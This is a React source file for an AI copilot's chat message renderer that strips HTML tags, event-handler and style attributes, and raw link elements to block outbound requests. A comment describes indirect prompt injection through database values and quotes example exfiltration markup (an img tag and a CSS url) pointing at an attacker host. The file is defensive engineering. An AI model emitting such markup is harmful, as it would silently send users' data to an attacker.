import React, { useCallback, useEffect, useState } from 'react'
import JsxParser from 'react-jsx-parser'
import MarkdownToJsxString from 'uiSrc/services/formatter/MarkdownToJsxString'
import { CloudLink } from 'uiSrc/components/markdown'
import { AdditionalRedisModule } from 'apiClient'
import { ChatExternalLink, CodeBlock } from './components'

export interface CodeProps {
  children: string
  lang: string
}

/**
 * Copilot answers are plain markdown (text, tables, code, links). They never
 * contain images or embedded media. Because message content can be influenced
 * by untrusted data (e.g. indirect prompt injection via values stored in the
 * database), we block every tag able to trigger an outbound request on render
 * — otherwise a crafted `<img src="https://attacker/?data=...">` would silently
 * exfiltrate data as soon as the browser loads it. See RED-194228 / VDP-4596.
 */
const BLACKLISTED_TAGS = [
  'iframe',
  'script',
  'img',
  'image',
  'picture',
  'source',
  'video',
  'audio',
  'track',
  'object',
  'embed',
  'style',
  'svg',
  'input',
]

// Strip event handlers (default) plus `style`, which can beacon out via
// CSS `background-image: url(https://attacker/...)`.
const BLACKLISTED_ATTRS: Array<string | RegExp> = [/^on.+/i, /^style$/i]

// Case-sensitive strip of raw HTML <link> elements to prevent external
// resource loading while preserving the PascalCase <Link> component emitted by
// the markdown formatter. JsxParser's blacklistedTags is case-insensitive, so
// blacklisting `link` would also drop legitimate <Link> — handle it here.
const LOWERCASE_LINK_TAG = /<link\b[^>]*\/?>|<\/link\s*>/g

export interface Props {
  onRunCommand?: (query: string) => void
  modules?: AdditionalRedisModule[]
  children: string
  onMessageRendered?: () => void
}

const MarkdownMessage = (props: Props) => {
  const { modules, children, onMessageRendered, onRunCommand } = props

  const [content, setContent] = useState('')
  const [parseAsIs, setParseAsIs] = useState(false)

  const ChatCodeBlock = useCallback(
    (codeProps: CodeProps) => (
      <CodeBlock {...codeProps} modules={modules} onRunCommand={onRunCommand} />
    ),
    [modules],
  )
  const components: any = {
    Code: ChatCodeBlock,
    CloudLink,
    Link: ChatExternalLink,
  }

  useEffect(() => {
    const formatContent = async () => {
      try {
        const formated = await new MarkdownToJsxString().format({
          data: children,
          codeOptions: { allLangs: true },
        })
        setContent(formated)
      } catch {
        setParseAsIs(true)
      }
    }

    formatContent()
  }, [children])

  useEffect(() => {
    if (content) {
      onMessageRendered?.()
    }
  }, [content])

  if (parseAsIs) {
    return <>{children}</>
  }

  return (
    // @ts-ignore
    <JsxParser
      components={components}
      blacklistedTags={BLACKLISTED_TAGS}
      blacklistedAttrs={BLACKLISTED_ATTRS}
      autoCloseVoidElements
      jsx={content.replace(LOWERCASE_LINK_TAG, '')}
      onError={() => setParseAsIs(true)}
    />
  )
}

export default React.memo(MarkdownMessage)
